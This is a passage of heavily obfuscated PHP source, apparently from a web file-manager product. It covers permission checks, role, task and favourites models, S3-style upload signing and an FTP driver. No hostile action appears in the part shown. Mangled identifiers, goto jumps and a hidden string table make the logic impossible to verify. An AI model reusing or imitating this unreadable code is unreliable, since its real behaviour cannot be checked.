!0; } return !!($‰üù“‚ğ & $ƒçí†¥ë); } public static function authCheckShow($Ú­Û‘â´) { return self::authCheck($Ú­Û‘â´, self::AUTH_SHOW); } public static function authCheckView($ÆõıõëÖ) { return self::authCheck($ÆõıõëÖ, self::AUTH_VIEW); } public static function authCheckDownload($¹®¦ÈÔÉ) { return self::authCheck($¹®¦ÈÔÉ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($çÒ°ÀÁ) { return self::authCheck($çÒ°ÀÁ, self::AUTH_UPLOAD); } public static function authCheckEdit($À¯ÖÂ©) { return self::authCheck($À¯ÖÂ©, self::AUTH_EDIT); } public static function authCheckRemove($££“ÖÅ§) { return self::authCheck($££“ÖÅ§, self::AUTH_REMOVE); } public static function authCheckShare($àƒŠà‹Ÿ) { return self::authCheck($àƒŠà‹Ÿ, self::AUTH_SHARE); } public static function authCheckComment($³©ø‡Üô) { return self::authCheck($³©ø‡Üô, self::AUTH_COMMENT); } public static function authCheckEvent($Óüà·ğô) { return self::authCheck($Óüà·ğô, self::AUTH_EVENT); } public static function authCheckRoot($ö¨ƒñüé) { return self::authCheck($ö¨ƒñüé, self::AUTH_ROOT); } public static function authCheckAction($ë§İ÷åƒ, $Ë“ö¡Úü) { $úÏåÚÜ =& $_SERVER[­õöî’–]; $ó²‰ÛÈ = array($úÏåÚÜ[1869] => self::AUTH_VIEW, $úÏåÚÜ[1193] => self::AUTH_DOWNLOAD, $úÏåÚÜ[107] => self::AUTH_UPLOAD, $úÏåÚÜ[1819] => self::AUTH_EDIT, $úÏåÚÜ[1818] => self::AUTH_REMOVE, $úÏåÚÜ[1829] => self::AUTH_SHARE, $úÏåÚÜ[354] => self::AUTH_COMMENT, $úÏåÚÜ[1648] => self::AUTH_EVENT, $úÏåÚÜ[1870] => self::AUTH_ROOT); if (!isset($ó²‰ÛÈ[$Ë“ö¡Úü])) { return; } $¤ËôÒƒ“ = $ó²‰ÛÈ[$Ë“ö¡Úü]; $ë§İ÷åƒ = intval($ë§İ÷åƒ); if ($ë§İ÷åƒ <= 0) { return !1; } if (($ë§İ÷åƒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ë§İ÷åƒ & $¤ËôÒƒ“); } public static function authDisable($úï¬›‰, $€Şİ³Ï) { if (intval($úï¬›‰) <= 0) { return 0; } return intval($úï¬›‰) & ~$€Şİ³Ï; } public $optionType = "\x53\171\x73\164\x65\155\x2e\x73\x6f\x75\x72\x63\145\101\165\164\x68\114\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\141\x75\x74\150", "\x6c\x61\x62\x65\154", "\x64\x69\x73\x70\154\x61\171", "\x73\171\x73\164\145\x6d", "\163\157\x72\164"); public function initData() { $‚Èì£ì = $this->authDefault(); foreach ($‚Èì£ì as $¬è˜çˆ®) { $this->add($¬è˜çˆ®); } } public function findAuth($ß¼†ñÏ”, $„Æ»Å—ö) { $òÇë¦ÉÃ =& $_SERVER[­õöî’–]; $ş‰šÈ— = parent::listData(); foreach ($ş‰šÈ— as $Ş»ƒæ¦) { $±ë­ûò“ = intval($Ş»ƒæ¦[$òÇë¦ÉÃ[413]]); if ($±ë­ûò“ <= 0 || $Ş»ƒæ¦[$òÇë¦ÉÃ[1871]] == 0) { continue; } if (($±ë­ûò“ & $ß¼†ñÏ”) != $ß¼†ñÏ”) { continue; } if (($±ë­ûò“ & $„Æ»Å—ö) != 0) { continue; } return $Ş»ƒæ¦[$òÇë¦ÉÃ[399]]; } return !1; } public function findAuthReadOnly() { $ô„¯øÂ­ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÆïÇµş = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ô„¯øÂ­, $ÆïÇµş); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $³®ğ´ƒ =& $_SERVER[­õöî’–]; $İÍ•«Ñå = parent::listData(); $¸Ë‚æ“ = !1; foreach ($İÍ•«Ñå as $¼ğåĞ¨á) { if ($¼ğåĞ¨á[$³®ğ´ƒ[413]] <= 0 || $¼ğåĞ¨á[$³®ğ´ƒ[1871]] == $³®ğ´ƒ[197]) { continue; } if (!$¸Ë‚æ“) { $¸Ë‚æ“ = $¼ğåĞ¨á; continue; } if ($¸Ë‚æ“[$³®ğ´ƒ[413]] > $¼ğåĞ¨á[$³®ğ´ƒ[413]]) { $¸Ë‚æ“ = $¼ğåĞ¨á; } } return $¸Ë‚æ“ ? $¸Ë‚æ“[$³®ğ´ƒ[399]] : $³®ğ´ƒ[12]; } public function listData($ØÍÊ·È = false, $îÑé¨Ê£ = "\x73\157\162\164", $ºşÂãİ = false) { return parent::listData($ØÍÊ·È, $îÑé¨Ê£, $ºşÂãİ); } public function update($ºüú• «, $óø“Û‡´) { $É¾¬‘ û =& $_SERVER[­õöî’–]; $Ùğ÷¡É» = parent::listData($ºüú• «); $½Ö÷ÙŒ = $this->findByName($óø“Û‡´[$É¾¬‘ û[32]]); if (!$Ùğ÷¡É» || $½Ö÷ÙŒ && $½Ö÷ÙŒ[$É¾¬‘ û[399]] != $Ùğ÷¡É»[$É¾¬‘ û[399]]) { return !1; } $this->filterAuth($óø“Û‡´[$É¾¬‘ û[413]]); return parent::update($ºüú• «, $óø“Û‡´); } public function remove($ÖÓ×†®) { $­ØÛŒşï = parent::listData($ÖÓ×†®); if (!$­ØÛŒşï || $­ØÛŒşï[$_SERVER[­õöî’–][1283]]) { return !1; } return parent::remove($ÖÓ×†®); } public function add($Îê‡İ¿Ö = array()) { $ÖéØã¸š =& $_SERVER[­õöî’–]; if ($this->findByName($Îê‡İ¿Ö[$ÖéØã¸š[32]])) { return !1; } $ĞšşœŠ¸ = array($ÖéØã¸š[32] => $ÖéØã¸š[12], $ÖéØã¸š[413] => 1, $ÖéØã¸š[1872] => $ÖéØã¸š[1859], $ÖéØã¸š[1871] => 1, $ÖéØã¸š[1283] => 0, $ÖéØã¸š[1873] => 0); $Îê‡İ¿Ö = array_merge($ĞšşœŠ¸, $Îê‡İ¿Ö); $Îê‡İ¿Ö[$ÖéØã¸š[1873]] = $this->getSort(); $this->filterAuth($Îê‡İ¿Ö[$ÖéØã¸š[413]]); return parent::insert($Îê‡İ¿Ö); } private function getSort() { $™ĞôÛ€ˆ =& $_SERVER[­õöî’–]; $÷ıè³§¸ = parent::listData(); $®÷»èÜÎ = array_to_keyvalue($÷ıè³§¸, $™ĞôÛ€ˆ[12], $™ĞôÛ€ˆ[1873]); return empty($®÷»èÜÎ) ? 0 : max($®÷»èÜÎ) + 1; } private function filterAuth(&$ÔÔ‘œ¸Á) { if (!$ÔÔ‘œ¸Á) { return; } $ˆ‰š¦ìë = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $°–æ™µ¤ = array(); foreach ($ˆ‰š¦ìë as $‹íã„êœ) { if ($ÔÔ‘œ¸Á & $‹íã„êœ) { $°–æ™µ¤[] = $‹íã„êœ; } } if (in_array(self::AUTH_ROOT, $°–æ™µ¤)) { $ÔÔ‘œ¸Á = array_sum($ˆ‰š¦ìë); return; } $Î€àûÀÇ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($°–æ™µ¤ as $‹íã„êœ) { if (isset($Î€àûÀÇ[$‹íã„êœ])) { $°–æ™µ¤ = array_merge($°–æ™µ¤, $Î€àûÀÇ[$‹íã„êœ]); } } $°–æ™µ¤[] = self::AUTH_SHOW; $ÔÔ‘œ¸Á = array_sum(array_unique($°–æ™µ¤)); } public function sort($Êï„ø«, $¹Å×¡Á) { return parent::update($Êï„ø«, $¹Å×¡Á); } } goto C¡­¿Ş®¼; Aç—ÌğÄ©: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\x72\157\154\145\114\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x61\x75\164\150", "\154\141\x62\x65\x6c", "\x64\151\x73\x70\x6c\x61\171", "\163\171\x73\x74\x65\155", "\144\145\x73\143", "\x69\x67\x6e\157\162\145\105\170\164", "\x69\147\156\x6f\162\145\x46\x69\x6c\x65\x53\x69\172\145", "\x61\144\x6d\151\x6e\151\163\164\x72\x61\x74\157\162", "\163\157\162\x74"); public function listData($ßşôÓ‡ = false, $‘Ã®ßÓ = "\x73\x6f\x72\164", $íšìû°Á = false) { $¤Çä‹ =& $_SERVER[­õöî’–]; $ÎĞÄï£ = parent::listData($ßşôÓ‡, $‘Ã®ßÓ, $íšìû°Á); if (!$ßşôÓ‡) { foreach ($ÎĞÄï£ as $¦³üõåü => $“²²œÍ) { if ($“²²œÍ[$¤Çä‹[2047]] == 1) { $ÎĞÄï£[$¦³üõåü][$¤Çä‹[453]] = LNG($¤Çä‹[2282]); } } } return $ÎĞÄï£; } public function update($ùÀ÷ş’³, $İªÙ†Û²) { $™å±Ÿ™ˆ =& $_SERVER[­õöî’–]; $ğŠˆ¬¥¸ = parent::listData($ùÀ÷ş’³); $“ÊŞÍ÷¸ = $this->findByName($İªÙ†Û²[$™å±Ÿ™ˆ[32]]); if (!$ğŠˆ¬¥¸ || $“ÊŞÍ÷¸ && $“ÊŞÍ÷¸[$™å±Ÿ™ˆ[399]] != $ğŠˆ¬¥¸[$™å±Ÿ™ˆ[399]]) { return !1; } if ($“ÊŞÍ÷¸[$™å±Ÿ™ˆ[2047]] == 1) { $İªÙ†Û² = array($™å±Ÿ™ˆ[32] => $İªÙ†Û²[$™å±Ÿ™ˆ[32]], $™å±Ÿ™ˆ[1872] => $İªÙ†Û²[$™å±Ÿ™ˆ[1872]]); } $this->filterAuth($İªÙ†Û²[$™å±Ÿ™ˆ[413]]); return parent::update($ùÀ÷ş’³, $İªÙ†Û²); } public function remove($Ìö„¨¯È) { $¬àœ³¥Ñ = parent::listData($Ìö„¨¯È); if (!$¬àœ³¥Ñ || $¬àœ³¥Ñ[$_SERVER[­õöî’–][1283]]) { return !1; } return parent::remove($Ìö„¨¯È); } public function add($™ş…ù˜½) { $´Ê„Ê‘º =& $_SERVER[­õöî’–]; $ëÛŸƒİ« = $™ş…ù˜½[$´Ê„Ê‘º[32]]; if ($this->findByName($ëÛŸƒİ«)) { return !1; } $ŒÉ—ŸÒæ = array($´Ê„Ê‘º[420] => $ëÛŸƒİ«, $´Ê„Ê‘º[1855] => $´Ê„Ê‘º[12], $´Ê„Ê‘º[1851] => $´Ê„Ê‘º[1859], $´Ê„Ê‘º[2283] => 1, $´Ê„Ê‘º[1854] => 0, $´Ê„Ê‘º[2284] => 0, $´Ê„Ê‘º[1853] => $this->getSort()); $™ş…ù˜½ = array_merge($ŒÉ—ŸÒæ, $™ş…ù˜½); $this->filterAuth($™ş…ù˜½[$´Ê„Ê‘º[413]]); return parent::insert($™ş…ù˜½); } private function getSort() { $Ú‚ÊÏô¤ =& $_SERVER[­õöî’–]; $¤ÍëûòÎ = parent::listData(); $ºÀı„ê = array_to_keyvalue($¤ÍëûòÎ, $Ú‚ÊÏô¤[12], $Ú‚ÊÏô¤[1873]); return empty($ºÀı„ê) ? 0 : max($ºÀı„ê) + 1; } private function filterAuth(&$‘š™š¢„) { $î¦»Áé‰ =& $_SERVER[­õöî’–]; $ü£Õøõ = array(); $áñ‹¼å = array_filter(explode($î¦»Áé‰[50], $‘š™š¢„)); foreach ($áñ‹¼å as $‘š™š¢„) { $Æõ× ‘â = explode($î¦»Áé‰[10], $‘š™š¢„); if ($Æõ× ‘â[0] == $î¦»Áé‰[2285] && $Æõ× ‘â[1] != $î¦»Áé‰[1189]) { $Éõ£ş = $Æõ× ‘â[0] . $î¦»Áé‰[10] . $Æõ× ‘â[1] . $î¦»Áé‰[2286]; if (!in_array($Éõ£ş, $áñ‹¼å)) { $ü£Õøõ[] = $Éõ£ş; } } $ü£Õøõ[] = $‘š™š¢„; } $‘š™š¢„ = implode($î¦»Áé‰[50], $ü£Õøõ); } public function findRoleDefault() { $·µˆÙ® =& $_SERVER[­õöî’–]; $µõÛïä = parent::listData(); $âğÚÓÜ = !1; foreach ($µõÛïä as $âä³¶¶Ú) { if (!$âä³¶¶Ú || $âä³¶¶Ú[$·µˆÙ®[1871]] == $·µˆÙ®[197] || $âä³¶¶Ú[$·µˆÙ®[2047]] == 1) { continue; } if (strstr($âä³¶¶Ú[$·µˆÙ®[413]], $·µˆÙ®[2287])) { continue; } if (!strstr($âä³¶¶Ú[$·µˆÙ®[413]], $·µˆÙ®[2288])) { continue; } if (!$âğÚÓÜ) { $âğÚÓÜ = $âä³¶¶Ú; continue; } $ŠÂÉëå¼ = explode($·µˆÙ®[50], $âğÚÓÜ[$·µˆÙ®[413]]); $²óşÒü = explode($·µˆÙ®[50], $âä³¶¶Ú[$·µˆÙ®[413]]); if (count($ŠÂÉëå¼) > count($²óşÒü)) { $âğÚÓÜ = $âä³¶¶Ú; } } return $âğÚÓÜ ? $âğÚÓÜ[$·µˆÙ®[399]] : $·µˆÙ®[12]; } public function sort($¿éùÎÏ„, $­…›ª»ø) { return parent::update($¿éùÎÏ„, $­…›ª»ø); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\164\141\163\x6b\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x74\x79\160\x65", "\x65\x76\x65\x6e\x74", "\164\151\x6d\145", "\x64\145\163\x63", "\163\171\x73\164\145\155", "\145\156\141\142\x6c\x65", "\154\141\x73\164\122\165\x6e", "\163\x6f\x72\x74"); public function listData($™˜Áğ”Ø = false, $Îß¬Ú±Ù = "\163\157\162\164", $ø‰Å¶…Ä = false) { return parent::listData($™˜Áğ”Ø, $Îß¬Ú±Ù, $ø‰Å¶…Ä); } public function add($ò•Ğ îƒ) { $¶ÅÍºÍã =& $_SERVER[­õöî’–]; $ÎÅ›‘ßÉ = $this->findByName($ò•Ğ îƒ[$¶ÅÍºÍã[32]]); if ($ÎÅ›‘ßÉ) { return !1; } $ò•Ğ îƒ[$¶ÅÍºÍã[1620]] = 0; $ò•Ğ îƒ[$¶ÅÍºÍã[1873]] = $this->getSort(); return parent::insert($ò•Ğ îƒ); } private function getSort() { $–úÇÍ“Ö =& $_SERVER[­õöî’–]; $É½†ûÒ³ = parent::listData(); $­‘¥êÏ„ = array_to_keyvalue($É½†ûÒ³, $–úÇÍ“Ö[12], $–úÇÍ“Ö[1873]); return empty($­‘¥êÏ„) ? 0 : max($­‘¥êÏ„) + 1; } public function update($¡ıİ±é, $¥üÚœÙ) { $ãğ¼’‚Ô =& $_SERVER[­õöî’–]; $Îé…¿¦Ã = $this->listData($¡ıİ±é); $øç£«õ¿ = $this->findByName($¥üÚœÙ[$ãğ¼’‚Ô[32]]); if (!$Îé…¿¦Ã || $øç£«õ¿ && $øç£«õ¿[$ãğ¼’‚Ô[399]] != $Îé…¿¦Ã[$ãğ¼’‚Ô[399]]) { return !1; } return parent::update($¡ıİ±é, $¥üÚœÙ); } public function remove($Ñ„©­ÖÎ, $ƒâñÔ‹ë = false) { $ÔèÀÅÅ‚ =& $_SERVER[­õöî’–]; $‰ö±µúÁ = $this->listData($Ñ„©­ÖÎ); if (!$‰ö±µúÁ) { return; } if (!$ƒâñÔ‹ë && $‰ö±µúÁ[$ÔèÀÅÅ‚[1283]] == $ÔèÀÅÅ‚[88]) { return !1; } return parent::remove($Ñ„©­ÖÎ); } public function enable($â÷½õæİ, $âçç¸Çí) { return $this->update($â÷½õæİ, array($_SERVER[­õöî’–][2277] => $âçç¸Çí)); } public function run($ÎŠ¿ÉßÙ) { return $this->update($ÎŠ¿ÉßÙ, array($_SERVER[­õöî’–][2289] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($Ñ¶òìÁè) { $½ßÇ×²ó =& $_SERVER[­õöî’–]; return array($½ßÇ×²ó[1960] => array(USER_ID, $½ßÇ×²ó[2290])); } protected function listData() { $Ö÷õõ€© =& $_SERVER[­õöî’–]; $ï„ø·˜Ç = array($Ö÷õõ€©[1651] => USER_ID, $Ö÷õõ€©[484] => 0); $¶Æ·‰óÜ = $Ö÷õõ€©[2291]; $Ÿá”Ü­ = $this->field($¶Æ·‰óÜ)->where($ï„ø·˜Ç)->order($Ö÷õõ€©[2292])->select(); return $Ÿá”Ü­ ? $Ÿá”Ü­ : array(); } protected function resetCache() { } protected function listView() { $Ñö½À»» =& $_SERVER[­õöî’–]; $Ä€Ÿ±¼ã = $this->listData(); $Š˜¿§µ = array_filter_by_field($Ä€Ÿ±¼ã, $Ñö½À»»[33], $Ñö½À»»[416]); $ãğê‹ûë = array_to_keyvalue($Š˜¿§µ, $Ñö½À»»[12], $Ñö½À»»[84]); if (!$ãğê‹ûë) { return $Ä€Ÿ±¼ã; } $Æ¶›ç¨é = 2000; $§ªÊüÛ = array($Ñö½À»»[417] => array($Ñö½À»»[418], $ãğê‹ûë)); $ñ£¿¢‘’ = Model($Ñö½À»»[816])->listSource($§ªÊüÛ, $Æ¶›ç¨é); $ñ£¿¢‘’ = array_merge($ñ£¿¢‘’[$Ñö½À»»[83]], $ñ£¿¢‘’[$Ñö½À»»[82]]); $ñ£¿¢‘’ = array_to_keyvalue($ñ£¿¢‘’, $Ñö½À»»[402]); foreach ($Ä€Ÿ±¼ã as $Ù®‹ÇíÜ => $ƒ¨Ÿ ö) { $Ÿ€Ìãµ = $ñ£¿¢‘’[$ƒ¨Ÿ ö[$Ñö½À»»[84]]]; $Ÿ€Ìãµ = $Ÿ€Ìãµ ? $Ÿ€Ìãµ : array(); $Ä€Ÿ±¼ã[$Ù®‹ÇíÜ] = array_merge($Ÿ€Ìãµ, $ƒ¨Ÿ ö); } return $Ä€Ÿ±¼ã; } protected function addFav($Şñ™äŒØ, $ë¼ßÅ§ = '', $ü¥É³Ûç = "\x73\157\x75\162\143\145") { $ƒ‡Á¬› =& $_SERVER[­õöî’–]; $ÑÁ™‰—¨ = array($ƒ‡Á¬›[1651] => USER_ID, $ƒ‡Á¬›[484] => 0, $ƒ‡Á¬›[422] => $ü¥É³Ûç, $ƒ‡Á¬›[421] => $Şñ™äŒØ); if ($this->where($ÑÁ™‰—¨)->find()) { return !1; } $ÑÁ™‰—¨ = array($ƒ‡Á¬›[1651] => USER_ID, $ƒ‡Á¬›[484] => 0); $óÓÉ¸³‰ = $this->where($ÑÁ™‰—¨)->max($ƒ‡Á¬›[1873]); if (!$óÓÉ¸³‰) { $óÓÉ¸³‰ = 0; } if (!$ë¼ßÅ§ && $ü¥É³Ûç == $ƒ‡Á¬›[416]) { $„ìû€â´ = Model($ƒ‡Á¬›[1334])->where(array($ƒ‡Á¬›[417] => $Şñ™äŒØ))->find(); if (!$„ìû€â´) { return !1; } $ë¼ßÅ§ = $„ìû€â´[$ƒ‡Á¬›[32]]; } $ë¼ßÅ§ = $this->getAutoName($ë¼ßÅ§); $¯ó¦€ÀÙ = array($ƒ‡Á¬›[1651] => USER_ID, $ƒ‡Á¬›[484] => 0, $ƒ‡Á¬›[420] => $ë¼ßÅ§, $ƒ‡Á¬›[421] => $Şñ™äŒØ, $ƒ‡Á¬›[422] => $ü¥É³Ûç, $ƒ‡Á¬›[1853] => $óÓÉ¸³‰ + 1); return $this->add($¯ó¦€ÀÙ); } protected function remove($§ÄñÕµñ) { $¬ËŞÖµ =& $_SERVER[­õöî’–]; $ÃŸğô¸¾ = array($¬ËŞÖµ[1651] => USER_ID, $¬ËŞÖµ[419] => $§ÄñÕµñ); return $this->where($ÃŸğô¸¾)->delete(); } protected function removeByName($‰¢æ½øˆ) { $ëõÎÌŒ÷ =& $_SERVER[­õöî’–]; $£åÆê¼î = array($ëõÎÌŒ÷[1651] => USER_ID, $ëõÎÌŒ÷[420] => $‰¢æ½øˆ, $ëõÎÌŒ÷[484] => 0); return $this->where($£åÆê¼î)->delete(); } protected function rename($ÓÄ–’, $”½İŒúÙ) { $‘é†ÇÔ¯ =& $_SERVER[­õöî’–]; if ($ÓÄ–’ == $”½İŒúÙ) { return !1; } $ĞûÎÙã = $this->getAutoName($”½İŒúÙ); if ($”½İŒúÙ != $ĞûÎÙã) { return !1; } $ë€¿¸ºØ = array($‘é†ÇÔ¯[1651] => USER_ID, $‘é†ÇÔ¯[484] => 0, $‘é†ÇÔ¯[32] => $ÓÄ–’); return $this->where($ë€¿¸ºØ)->save(array($‘é†ÇÔ¯[32] => $”½İŒúÙ)); } protected function resetSort($„È¬×öš) { $É¦âÎÜ =& $_SERVER[­õöî’–]; $„È¬×öš = is_array($„È¬×öš) ? $„È¬×öš : array(); $äÊæÁåµ = array($É¦âÎÜ[1651] => USER_ID); for ($•îƒì§» = 0; $•îƒì§» < count($„È¬×öš); $•îƒì§»++) { $äÊæÁåµ[$É¦âÎÜ[419]] = $„È¬×öš[$•îƒì§»]; $this->where($äÊæÁåµ)->save(array($É¦âÎÜ[1853] => $•îƒì§» + 1)); } return !0; } protected function moveTop($§Æì»ÑÔ) { $Šò¯ÙÌ =& $_SERVER[­õöî’–]; $ ‚¶ƒ¸ = array($Šò¯ÙÌ[1651] => USER_ID, $Šò¯ÙÌ[484] => 0); $ÑûàØÒ· = $this->where($ ‚¶ƒ¸)->where(array($Šò¯ÙÌ[32] => $§Æì»ÑÔ))->find(); if (!$ÑûàØÒ·) { return; } $ôÙ¦‹Á = $this->field($Šò¯ÙÌ[399])->where($ ‚¶ƒ¸)->order($Šò¯ÙÌ[2292])->select(); $ôÙ¦‹Á = array_to_keyvalue($ôÙ¦‹Á, $Šò¯ÙÌ[12], $Šò¯ÙÌ[399]); $†‹âÒ«ı = $ôÙ¦‹Á; $ôÙ¦‹Á = array_remove_value($ôÙ¦‹Á, $ÑûàØÒ·[$Šò¯ÙÌ[399]]); array_unshift($ôÙ¦‹Á, $ÑûàØÒ·[$Šò¯ÙÌ[399]]); return $this->resetSort($ôÙ¦‹Á); } protected function moveBottom($°úÍ»å) { $¸Œ˜›íû =& $_SERVER[­õöî’–]; $ —íÚ­º = array($¸Œ˜›íû[1651] => USER_ID, $¸Œ˜›íû[484] => 0); $ï‘Ô¢™» = $this->where($ —íÚ­º)->max($¸Œ˜›íû[1873]); $œ‡»¸ê» = array($¸Œ˜›íû[1873] => $ï‘Ô¢™» + 1); return $this->where($ —íÚ­º)->where(array($¸Œ˜›íû[32] => $°úÍ»å))->save($œ‡»¸ê»); } private function getAutoName($Ùì¼¯Š) { $Á“Óöì¾ =& $_SERVER[­õöî’–]; $ªØ‡Î® = array($Á“Óöì¾[1651] => USER_ID, $Á“Óöì¾[484] => 0); $÷îêÒÏ¸ = $this->field($Á“Óöì¾[32])->where($ªØ‡Î®)->select(); $÷îêÒÏ¸ = array_to_keyvalue($÷îêÒÏ¸, $Á“Óöì¾[12], $Á“Óöì¾[32]); if (!$÷îêÒÏ¸ || !in_array($Ùì¼¯Š, $÷îêÒÏ¸)) { return $Ùì¼¯Š; } for ($º„ —Ó = 0; $º„ —Ó < count($÷îêÒÏ¸); $º„ —Ó++) { if (!in_array($Ùì¼¯Š . "\50{$º„ —Ó}\51", $÷îêÒÏ¸)) { return $Ùì¼¯Š . "\x28{$º„ —Ó}\51"; } } return $Ùì¼¯Š . "\50{$º„ —Ó}\x29"; } } goto e›ì‘Ó ã£; FÖ²ùŠóÌ: class PathDriverEDS extends PathDriverMinIO { public function __construct($Ü‹ÌÆßÑ) { parent::__construct($Ü‹ÌÆßÑ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ğ¨óç ) { parent::__construct($ğ¨óç ); $this->signatureVersion($_SERVER[­õöî’–][216]); } public function uploadFormData($¶·Úü©ä, $Ìú€ÀèÛ = 3600) { $³‹Øˆ’÷ =& $_SERVER[­õöî’–]; $İíñÑŒ = $³‹Øˆ’÷[198]; $¹ğ¯Øé» = $³‹Øˆ’÷[1353]; $‰ÑÃ¯„ = $³‹Øˆ’÷[62]; $íœ¨ë©³ = gmdate($³‹Øˆ’÷[1354]); $¡ºø³‘Ş = gmdate($³‹Øˆ’÷[742]); $»ÊĞ÷–€ = $³‹Øˆ’÷[1355]; $”Äß»Å´ = $Ìú€ÀèÛ . $³‹Øˆ’÷[12]; $Ñ‚éî²¨ = $³‹Øˆ’÷[1317]; $²Ì™’™ç = array($this->accessKey, $¡ºø³‘Ş, $this->region, $‰ÑÃ¯„, $»ÊĞ÷–€); $ß¿×İ× = implode($³‹Øˆ’÷[8], $²Ì™’™ç); $Ùú¤›àÁ = array($³‹Øˆ’÷[1319] => gmdate($³‹Øˆ’÷[1318], strtotime($³‹Øˆ’÷[1356])), $³‹Øˆ’÷[1320] => array(array($³‹Øˆ’÷[1322] => $this->bucket), array($³‹Øˆ’÷[1321] => $İíñÑŒ), array($³‹Øˆ’÷[1323], $³‹Øˆ’÷[1324], $³‹Øˆ’÷[12]), array($³‹Øˆ’÷[1323], $³‹Øˆ’÷[1357], $³‹Øˆ’÷[12]), array($³‹Øˆ’÷[1323], $³‹Øˆ’÷[1358], $³‹Øˆ’÷[12]), array($³‹Øˆ’÷[1325] => $Ñ‚éî²¨), array($³‹Øˆ’÷[1359] => $ß¿×İ×), array($³‹Øˆ’÷[1360] => $¹ğ¯Øé»), array($³‹Øˆ’÷[1361] => $íœ¨ë©³), array($³‹Øˆ’÷[1362] => $”Äß»Å´))); $úØ—ûù¾ = base64_encode(json_encode($Ùú¤›àÁ)); $ïŞ¬şÙÏ = hash_hmac($³‹Øˆ’÷[1363], $¡ºø³‘Ş, $³‹Øˆ’÷[1364] . $this->secret, !0); $‰¶ºå·Ì = hash_hmac($³‹Øˆ’÷[1363], $this->region, $ïŞ¬şÙÏ, !0); $º‰İÊÏ¼ = hash_hmac($³‹Øˆ’÷[1363], $‰ÑÃ¯„, $‰¶ºå·Ì, !0); $ÂºĞÆÂ = hash_hmac($³‹Øˆ’÷[1363], $»ÊĞ÷–€, $º‰İÊÏ¼, !0); $Æ»ïŸ» = hash_hmac($³‹Øˆ’÷[1363], $úØ—ûù¾, $ÂºĞÆÂ); $Ã¹ÂûÉ• = array($³‹Øˆ’÷[215] => $³‹Øˆ’÷[12], $³‹Øˆ’÷[1365] => $³‹Øˆ’÷[12], $³‹Øˆ’÷[1321] => $İíñÑŒ, $³‹Øˆ’÷[1325] => $Ñ‚éî²¨, $³‹Øˆ’÷[1329] => $úØ—ûù¾, $³‹Øˆ’÷[1366] => $ß¿×İ×, $³‹Øˆ’÷[1367] => $¹ğ¯Øé», $³‹Øˆ’÷[1368] => $íœ¨ë©³, $³‹Øˆ’÷[1369] => $”Äß»Å´, $³‹Øˆ’÷[1370] => $Æ»ïŸ», $³‹Øˆ’÷[181] => $this->getHost()); return $Ã¹ÂûÉ•; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($Ùòæ“µÏ) { parent::__construct(); if (count($Ùòæ“µÏ) > 0) { $this->_init($Ùòæ“µÏ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¤€¨ğÕ±) { $¡¹‡ŠØ‚ =& $_SERVER[­õöî’–]; global $config; $this->appCharset = $config[$¡¹‡ŠØ‚[1371]]; $this->systemCharset = $config[$¡¹‡ŠØ‚[1372]]; if (isset($¤€¨ğÕ±[$¡¹‡ŠØ‚[1373]]) && $¤€¨ğÕ±[$¡¹‡ŠØ‚[1373]]) { $this->systemCharset = $¤€¨ğÕ±[$¡¹‡ŠØ‚[1373]]; } } public function iconvApp($ıŸ¥ï©º) { return $this->iconvTo($ıŸ¥ï©º, $this->systemCharset, $this->appCharset); } public function iconvSystem($¼Åİú­) { return $this->iconvTo($¼Åİú­, $this->appCharset, $this->systemCharset); } public function getPathOuter($øŸ•ªøÜ) { $Ñáİ©ÃÅ =& $_SERVER[­õöî’–]; $¸Ø…½‹‰ = $this->iconvApp($this->pathBase); $øŸ•ªøÜ = $this->iconvApp($øŸ•ªøÜ); if (substr($¸Ø…½‹‰, 0, 2) == $Ñáİ©ÃÅ[1374]) { $¸Ø…½‹‰ = BASIC_PATH . substr($¸Ø…½‹‰, 2); } if (substr($øŸ•ªøÜ, 0, 2) == $Ñáİ©ÃÅ[1374]) { $øŸ•ªøÜ = BASIC_PATH . substr($øŸ•ªøÜ, 2); } $¸Ø…½‹‰ = KodIO::clear($¸Ø…½‹‰); $øŸ•ªøÜ = KodIO::clear($øŸ•ªøÜ); $øŸ•ªøÜ = substr($øŸ•ªøÜ, strlen($¸Ø…½‹‰)); if (empty($this->pathDriver)) { return $øŸ•ªøÜ; } return $this->pathDriver . $Ñáİ©ÃÅ[8] . ltrim($øŸ•ªøÜ, $Ñáİ©ÃÅ[8]); } private function _init($úÁÀöœ = array()) { $“«ŸŞ¯ê =& $_SERVER[­õöî’–]; if (!function_exists($“«ŸŞ¯ê[1375])) { throw new Exception(LNG($“«ŸŞ¯ê[1376])); } $this->config = $úÁÀöœ; $this->charsetReset($úÁÀöœ); foreach ($úÁÀöœ as $í‹í¤É => $¨Ë¿ĞòÉ) { if (isset($this->{$í‹í¤É})) { $this->{$í‹í¤É} = $¨Ë¿ĞòÉ; } } return $this->_login($úÁÀöœ); } private function _login($äéÇÉîğ) { 